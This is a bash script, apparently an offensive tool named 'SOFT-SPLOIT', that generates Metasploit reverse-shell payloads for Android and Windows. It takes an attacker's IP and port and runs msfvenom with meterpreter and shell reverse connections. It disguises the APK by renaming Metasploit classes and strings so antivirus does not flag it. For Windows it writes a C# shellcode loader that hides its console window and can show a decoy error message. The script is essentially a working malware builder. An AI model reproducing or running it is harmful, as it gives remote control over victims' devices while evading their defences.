#!/bin/bash
#
#
#
#CTRL_C DETECT 
trap ctrl_c INT
ctrl_c() {
rm $path/msf/start-listener.rc > /dev/null 2>&1
echo ""
exit1
}
#resize terminal
resize -s 30 73 > /dev/null
#AUTO CLEAN
if [ -f $path/msf/start-listener.rc ]
then rm $path/msf/start-listener.rc
fi
#Colors
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
Escape="\033";
RedF="${Escape}[31m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Escape}[36m";
#options
path=`pwd`
apktool="$path/tools/apktool.jar"
VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
#CHECK ROOT
[[ 'id -u' -eq 0 ]] > /dev/null 2>&1 || { echo ; echo -e "You must be ${red}root ${Reset}to run the script"; echo ; exit 1; }
#vars
animate1 ()
{
clear
echo -n -e $red Script Starting  = = ;
sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1 ; done; done
clear
}
exit1() {
    echo -e $reset
    echo "          Exit ! "
    echo ""
    exit
}
bargicon ()
{
    echo -e $Reset
BAR='CHANGING NAME AND ICON OF PAYLOAD ... '
for i in {1..46}; do
echo -ne "\r${BAR:0:$i}"
sleep 0.05
done
echo ""
}
barg ()
{
BAR='GENERATING APK PAYLOAD  ...........'
echo -e "$red"
for i in {1..31}; do
    echo -ne "\r${BAR:0:$i}"
    sleep 0.05
done
echo ""
}
barg2 ()
{
BAR='GENERATING EXE PAYLOAD  ...........'
echo -e "$red"
for i in {1..31}; do
    echo -ne "\r${BAR:0:$i}"
    sleep 0.05
done
echo ""
}
barg3 ()
{
BAR='GENERATING HEX FILE  ...........'
echo -e "$red"
for i in {1..29}; do
    echo -ne "\r${BAR:0:$i}"
    sleep 0.05
done
echo ""
}
bargdecomp ()
{
BAR='DECOMPILING APK FILE ...........'

for i in {1..29}; do
    echo -ne "\r${BAR:0:$i}"
    sleep 0.05
done
echo ""
}
bargedit ()
{
BAR='EDITING APK FILE TO AVOID AV .............'

for i in {1..46}; do
    echo -ne "\r${BAR:0:$i}"
    sleep 0.05
done
echo ""
}
bargeedit1 ()
{
BAR='EDITING HEX FILE TO AVOID AV .............'
for i in {1..46}; do
    echo -ne "\r${BAR:0:$i}"
    sleep 0.05
done
echo ""
}
bargre ()
{
BAR='REBUILDING APK FILE .............'

for i in {1..30}; do
    echo -ne "\r${BAR:0:$i}"
    sleep 0.05
done
echo ""
}
bargcom (){
BAR='COMPILING HEX FILE TO EXE ........'

for i in {1..30}; do
    echo -ne "\r${BAR:0:$i}"
    sleep 0.05
done
echo ""
}
bargsign ()
{
BAR='SIGNING APK FILE .............'

for i in {1..28}; do
    echo -ne "\r${BAR:0:$i}"
    sleep 0.05
done
echo ""
}
barallo () {
BAR='ALLOCATE EXE FILE .............'

for i in {1..28}; do
    echo -ne "\r${BAR:0:$i}"
    sleep 0.05
done
echo ""
}
#banner
function banner {
clear
echo -e "
                 \e[1;33m* \e[1;32m      *       ╱▔▔▔▔▔▔▔▔╲       *    \e[1;33m   * \e[1;32m
                 \e[1;31m    * \e[1;31m      * \e[1;32m  ▏\e[1;31m        \e[1;32m▕   \e[1;31m*      \e[1;31m * \e[1;32m
            \e[1;31m*   \e[1;32m * \e[1;33m      *      \e[1;32m▕\e[1;31m ╭━╮\e[1;32m┈┈\e[1;31m╭━╮\e[1;32m▕     \e[1;33m  *      \e[1;32m * \e[1;31m   * \e[1;32m
                                 ╲\e[1;31m╰━╯\e[1;32m╱╲\e[1;31m╰━╯\e[1;32m╱ 
                  \e[1;32m   (@\e[1;33m_\e[1;31m \e[1;32m  \e[1;33m    \e[1;32m \e[1;32m  ▏╮┈▔▔┈╭▕ \e[1;31m  
              \e[1;32m _     \e[1;33m ) \_\e[1;32m_____\e[1;31m____\e[1;31m┣╋╋╋╋┫\e[1;31m____\e[1;32m_______________
             \e[1;32m (_)\e[31m@8@8\e[1;32m{}< \e[1;33m_\e[1;32m_____\e[1;31m________\e[1;31m______\e[1;32m_______________\\
                     \e[1;33m )_/  \e[1;31m    ;;; ┣╋╋╋╋┫ ;;;
                    \e[1;32m (@      \e[1;31m  ;;\e[1;32m ╲▂▂▂▂▂▂╱ \e[31m;;
                                \e[1;31m                     "
echo -e "                     $cyan S $green O $red F $purple T $reset - $blue S $red P $reset L $GreenF O $purple I $YellowF T             "
echo ''
echo -e "      $red++++$yellow[$purple Developed by H.KIRA $red| ${purple}Specially For Linux users $yellow]$red++++ "
echo ""
echo -e "$yellow[$green SOFT-EXPLOIT MENU $yellow]:"
}
#function lhost
function get_lhost() 
{
  read -p "Enter Your Ip Address = " ip
  ip_check
}
#function lport
function get_lport() 
{
  read -p "Enter Your Port Number = " p
  p_check
}
#function payload
function get_payload()
{
echo ""
echo "[1] Meterpreter_Reverse_tcp		[4] Shell_Reverse_tcp"
echo "[2] Meterpreter_Reverse_http		[5] Shell_Reverse_http"
echo "[3] Meterpreter_Reverse_https		[6] Shell_Reverse_https"
echo ""
echo -e "$reset Select a payload number: \c"
read option
case $option in
1)
payload='android/meterpreter/reverse_tcp'
;;
2)
payload='android/meterpreter/reverse_http'
;;
3)
payload='android/meterpreter/reverse_https'
;;
4)
payload='android/shell/reverse_tcp'
;;
5)
payload='android/shell/reverse_http'
;;
6)
payload='android/shell/reverse_https'
;;
*)
echo -e $red
echo  " INVALID CHOICE !  "
echo -e $reset
get_payload
;;
esac
}
#!ARCH 
#function arch(){
#echo "[1] 64 bit "
#echo "[2] 32 bit "
#echo ""
#echo -e $reset"Select Victim Architecture : \c"
#read arc
#case $arc in 
#1)
#arcc='1'
#;;
#2)
#arcc='2'
#;;
#*)
#echo -e $red
#echo  " INVALID CHOICE !  "
#echo -e $reset
#arch
#;;
#esac
#}
#function payload1
function get_payload1()
{
echo ""
echo "[1] Meterpreter_Reverse_tcp        [5] Shell_Reverse_tcp"
echo "[2] Meterpreter_Reverse_http       [6] meterpreter_reverse_ipv6_tcp"
echo "[3] Meterpreter_Reverse_https      [7] meterpreter_reverse_ipv6_http"
echo "[4] powershell_reverse_tcp         [8] meterpreter_reverse_ipv6_https"
echo ""
echo -e "$reset Select a payload number: \c"
read option
case $option in
1)
payload='windows/meterpreter/reverse_tcp'
;;
2)
payload='windows/meterpreter/reverse_http'
;;
3)
payload='windows/meterpreter/reverse_https'
;;
4)
payload='windows/powershell_reverse_tcp'
;;
5)
payload='windows/shell/reverse_tcp'
;;
6)
payload='windows/meterpreter/reverse_ipv6_tcp'
;;
7)
payload='windows/meterpreter/reverse_ipv6_http'
;;
8)
payload='windows/meterpreter/reverse_ipv6_https'
;;
*)
echo -e $red
echo  " INVALID CHOICE !  "
echo -e $reset
get_payload1
;;
esac
}
#function name
function payload_name()
{
    read -p "Enter name of output payload = " n
}
#function original apk
function orig_apk()
{
 read
}
#function change icon
function change_icon()
{
 read
}
#function simple apk payload
function simpleapkpayload()
{
echo -e "$reset"
get_lhost
get_lport
payload_name
get_payload
barg
xterm -T " GENERATE APK PAYLOAD" -fg red -e "msfvenom -p $payload LHOST=$ip LPORT=$p -a dalvik --platform android R > $path/msf/output/$n.apk  "
}
#function simple exe payload
function simpleexepayload(){
echo -e "$reset"
get_lhost
get_lport
payload_name
get_payload1
barg2
xterm -T " GENERATE EXE PAYLOAD" -fg red -e "msfvenom -p $payload LHOST=$ip LPORT=$p -f exe R > $path/msf/output/$n.exe  "
}
#FUNCTION SIGN
function signn() {
if [ ! -f ~/.android/debug.keystore ]; then
     echo -e "$red"
     echo "  NO Debug KEY ! Generating one now..."
     if [ ! -d "~/.android" ]; then
       mkdir ~/.android > /dev/null 2>&1
     fi
     echo -e "$reset"
     keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000
 fi
 jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $path/msf/output/$n.apk androiddebugkey 
 jarsigner -verify -certs $path/msf/output/$n.apk 
}
#FUNCTION APK BYBASS AV
function apkav() {
echo -e "$reset"
get_lhost
get_lport
payload_name
get_payload
barg
xterm -T " GENERATE APK PAYLOAD" -fg red -e "msfvenom -p $payload LHOST=$ip LPORT=$p -a dalvik --platform android R > $path/msf/output/$n.apk  "
bargdecomp
xterm -T " DECOMPILING APK PAYLOAD " -fg red -e "java -jar $apktool d -f -o $path/payload $path/msf/output/$n.apk && rm $path/msf/output/$n.apk "
bargedit
mv payload/smali/com/metasploit payload/smali/com/$VAR1
mv payload/smali/com/$VAR1/stage payload/smali/com/$VAR1/$VAR2
mv payload/smali/com/$VAR1/$VAR2/Payload.smali payload/smali/com/$VAR1/$VAR2/$VAR3.smali
sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" payload/smali/com/$VAR1/$VAR2/*
sed -i "s#Payload#$VAR3#g" payload/smali/com/$VAR1/$VAR2/*
sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.$VAR4.$VAR5.$VAR6#" payload/smali/com/$VAR1/$VAR2/$VAR3.smali
sed -i "s#payload#$VAR7#g" payload/smali/com/$VAR1/$VAR2/$VAR3.smali
sed -i "s#com.metasploit.stage#com.$VAR1.$VAR2#" payload/AndroidManifest.xml
sed -i "s#metasploit#$VAR8#" payload/AndroidManifest.xml
sed -i "s#MainActivity#$n#" payload/res/values/strings.xml
sed -i '/.SET_WALLPAPER/d' payload/AndroidManifest.xml
sed -i '/WRITE_SMS/a<uses-permission android:name="android.permission.SET_WALLPAPER"/>' payload/AndroidManifest.xml
bargre
xterm -T "REBUILDING APK FILE" -fg red -e "java -jar $apktool b $path/payload -o $path/msf/output/$n.apk && rm -r $path/payload"
bargsign
xterm -T "KEYSTORE CHECK" -fg red -e " bash $path/tools/sign.sh "
xterm -T "SIGNING APK FILE" -fg red -e "cd $path/msf/output && jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $n.apk androiddebugkey && jarsigner -verify -certs $n.apk "
}
#ERROR MESSAGE 
function msg() {
echo -e "Display an error message ! (y/n) : \c"
read error
case $error in
y)
berror=1 
echo -e "Write title error message : \c"
read title  
echo -e "Write the error message : \c"
read notitle
;;
Y)
berror=1
echo -e "Write title error message : \c"
read title  
echo -e "Write the error message : \c"
read notitle
;;
n)
berror=0
;;
N)
berror=0
;;
*) echo -e $red 
echo "  Select (Y/n) ! " 
echo -e $reset
msg
;;
esac
}
#EXE BYBASS AV
function exeav() {
echo -e "$reset"
get_lhost
get_lport
payload_name
msg
get_payload1 
barg3
xterm -T " GENERATE HEX FILE " -fg red -e "msfvenom -p $payload LHOST=$ip LPORT=$p -f hex --smallest >> $path/1 "
bargeedit1
sed 's/^/string HexadezimalKatea ="/' 1 > 2
sed 's/$/";/' 2 > 3
mv 3 $path/msf/output/4
rm -f 1
rm -f 2
cd $path/msf/output
echo "using System;" >> 5
echo "using System.Reflection;" >> 5
echo "using System.Runtime.InteropServices;" >> 5
if [ "$berror" == "1" ]; then
echo "using System.Windows.Forms;" >> 5;
fi
echo "namespace easyhack" >> 5
echo "{ class Program" >> 5
echo "{ [DllImport(\"kernel32.dll\", SetLastError = true)]" >> 5
echo "static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);" >> 5
echo "public delegate uint Ret1ArgDelegate(uint address);" >> 5
echo "static uint PlaceHolder1(uint arg1) { return 0; }" >> 5
echo "[DllImport(\"kernel32.dll\")]" >> 5
echo "static extern IntPtr GetConsoleWindow();" >> 5
echo "[DllImport(\"user32.dll\")]" >> 5
echo "static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);" >> 5
echo "const int SW_HIDE = 0;" >> 5
echo "unsafe static void Main(string[] args)" >> 5
if [ "$berror" == "y" ]; then
echo "{ MessageBox.Show(\"$notitle\", \"$title\",MessageBoxButtons.OK,MessageBoxIcon.Error);" >> 5
echo "var handle = GetConsoleWindow();" >> 5;
else
echo "{ var handle = GetConsoleWindow();" >> 5;
fi
echo "ShowWindow(handle, SW_HIDE);" >> 5
cat 4 >> 5
rm -f 4
echo "byte[] shellKodeahex = HexStringToByteArray(HexadezimalKatea);" >> 5
echo "burutu(shellKodeahex); }" >> 5
echo "public static byte[] HexStringToByteArray(String hexString)" >> 5
echo "{ byte[] retval = new byte[hexString.Length / 2];" >> 5
echo "for (int i = 0; i < hexString.Length; i += 2)" >> 5
echo "retval [i / 2] = Convert.ToByte (hexString.Substring (i, 2), 16);" >> 5
echo "return retval; }" >> 5
echo "unsafe public static void burutu(byte[] asmBytes)" >> 5
echo "{ fixed (byte* startAddress = &asmBytes[0])" >> 5
echo "{ Type delType = typeof(Delegate);" >> 5
echo "FieldInfo _methodPtr = delType.GetField(\"_methodPtr\", BindingFlags.NonPublic | BindingFlags.Instance);" >> 5
echo "Ret1ArgDelegate del = new Ret1ArgDelegate(PlaceHolder1);" >> 5
echo "_methodPtr.SetValue(del, (IntPtr) startAddress);" >> 5
echo "uint outOldProtection;" >> 5
echo "VirtualProtect((IntPtr) startAddress, (uint) asmBytes.Length, 0x40, out outOldProtection);" >> 5
echo "uint n = (uint)0x00000001;" >> 5
echo "n = del(n);" >> 5
echo "Console.WriteLine(\"{0:x}\", n);" >> 5
echo "Console.ReadKey();" >> 5
echo "}}}}" >> 5
bargcom
if [ "$berror" == "0" ]; then
xterm -T "COMPILING HEX FILE " -fg red -e "mcs -platform:x86 -unsafe 5 -out:$path/msf/output/$n.exe"
elif [ "$berror" == "1" ]; then
xterm -T "COMPILING HEX FILE " -fg red -e "mcs -platform:x86 -unsafe 5 -reference:System.Windows.Forms -out:$path/msf/output/$n.exe"
fi
rm -f 5
t=`stat -c %s $path/msf/output/$n.exe`
tt=`echo $((512 + $RANDOM%512))`
ttt=`echo $(($t + $RANDOM%2000))`
barallo
xterm -T "ALLOCATE EXE FILE " -fg red -e "fallocate -o $tt -l $ttt $path/msf/output/$n.exe"
} 
#IP CHECK
function ip_check()
{
if [[ "$ip" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]]; then
sleep 0.1
else
echo ""
echo -e "$red Invalid IP Adress ! $reset ";
echo ""
get_lhost
fi
}
#PORT CHECK
function p_check()
{
case ${p#[+]} in
*[!0-9]* ) 
echo ""
echo -e "$red Invalid PORT Number !  $reset"
echo ""
get_lport
;;
* )
if [[ $p -gt 65535 || $p = 0 ]]; then
echo ""
echo -e "$red Invalid PORT Number ! $reset"
echo ""
get_lport
fi
;;
esac
}
#APK-SIZE
check() {
if [[ -f $path/msf/output/$n.apk ]];
then 
if [[ "$(stat -c %s $path/msf/output/$n.apk)" != "0" ]]; 
then
echo -e $reset
echo "         SUCCES ✓"
echo ""
read
elif  [[ "$(stat -c %s $path/msf/output/$n.apk)" = "0" ]]; 
then 
echo -e $reset
echo "         FAIL !"
echo ""
read
fi
else 
echo -e $reset
echo "         FAIL !"
echo ""
read
fi
}
#EXE-SIZE
checkk() {
if [[ -f $path/msf/output/$n.exe ]];
then 
if [[ "$(stat -c %s $path/msf/output/$n.exe)" != "0" ]]; 
then
echo -e $reset
echo "         SUCCES ✓"
echo ""
read
elif  [[ "$(stat -c %s $path/msf/output/$n.exe)" = "0" ]]; 
then 
echo -e $reset
echo "         FAIL !"
echo ""
read
fi
else 
echo -e $reset
echo "         FAIL !"
echo ""
read
fi
}
#MAIN MENU
function main_menu()
{
banner 
echo -e $reset
echo "    0. EXIT SCRIPT "
echo "    1. SIMPLE APK PAYLOAD "
echo "    2. SIMPLE EXE PAYLOAD "
echo "    3. APK BYBASS AV"
echo "    4. EXE BYBASS AV"
echo "    5. APK BYBASS AV|ICON CHANGE"
echo "    6. EXE BYBASS AV|ICON CHANGE"
echo "    7. BACKDOOR ORIGINAL APK"
echo "    8. START LISTENER"
selectm
}
#menu
function selectm(){
echo ""
read -p $'   Select \033[1;31m────>\033[0m ' option
case "$option" in 
          0) exit1 ;;
          1) simpleapkpayload
          check
          main_menu
          ;;
          2) simpleexepayload
          checkk
          main_menu
          ;;
          3) apkav
          check
          main_menu
          ;; 
          4) exeav
          checkk
          main_menu
          ;;
          esac
          echo -e $red
          echo -e " Select a Valid Option !  $reset"
          selectm
}
animate1
main_menu
















